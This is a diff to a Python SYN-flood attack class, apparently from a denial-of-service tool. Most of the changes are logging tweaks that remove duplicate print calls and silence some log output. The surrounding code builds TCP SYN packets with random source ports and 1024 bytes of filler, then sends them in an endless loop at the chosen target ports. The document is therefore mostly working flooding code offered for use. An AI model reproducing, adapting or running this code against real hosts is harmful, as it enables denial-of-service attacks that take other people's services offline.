@@ -41,7 +41,6 @@ class SynFlood:
         except KeyboardInterrupt :
             print()
             attack_stop_msg = 'Attack Stopped!'
-            print(attack_stop_msg)
             logger.log(attack_stop_msg)
             exit() # exit when ctrl+c is pressed
 
@@ -56,7 +55,6 @@ class SynFlood:
                 except:
                     print()
                     error_msg = 'error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]'
-                    print(error_msg)
                     logger.log(error_msg)
                     exit()
                 else:
@@ -66,7 +64,7 @@ class SynFlood:
                     self.ports_in_attack.append(int(p))
                     print(p + ' ',end='')
 
-            logger.log('ports : ' + str(self.ports_in_attack))
+            logger.log('ports : ' + str(self.ports_in_attack) ,print_log=False)
 
         elif '-' in self.ports : # for ports range
             try :
@@ -75,13 +73,11 @@ class SynFlood:
             except :
                 print()
                 error_msg = 'error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]'
-                print(error_msg)
                 logger.log(error_msg)
                 exit()
             else:
                 self.ports_in_attack = list(range(port_start,port_end + 1))
                 ports_range_msg = 'ports : ' + str(port_start) + ' to ' + str(port_end)
-                print(ports_range_msg)
                 logger.log(ports_range_msg)
 
         else: # for single port
@@ -90,7 +86,6 @@ class SynFlood:
             except ValueError:
                 print()
                 error_msg = 'error : invalid port ---> e.g 80,22 or 1-65535 [--script-help or -sh for help]'
-                print(error_msg)
                 logger.log(error_msg)
                 exit()
             else:
@@ -107,7 +102,6 @@ class SynFlood:
 
     def run_attack(self):
         start_attack_timer_msg = '3.5 seconds to start attack ---> CTRL+C to stop ...'
-        print(start_attack_timer_msg)
         logger.log(start_attack_timer_msg)
 
         sleep(3.5)
@@ -122,7 +116,7 @@ class SynFlood:
         tcp = TCP(flags='S',sport=int(random_port),dport=int(port_in_attack))
         trash_data = Raw(b'd'*1024) # add some trash data to flood
         packet = ip / tcp / trash_data
-        logger.log('.................')
+        logger.log('.................' ,print_log=False)
         send(packet,verbose=1,loop=1)
 
     def __del__(self):
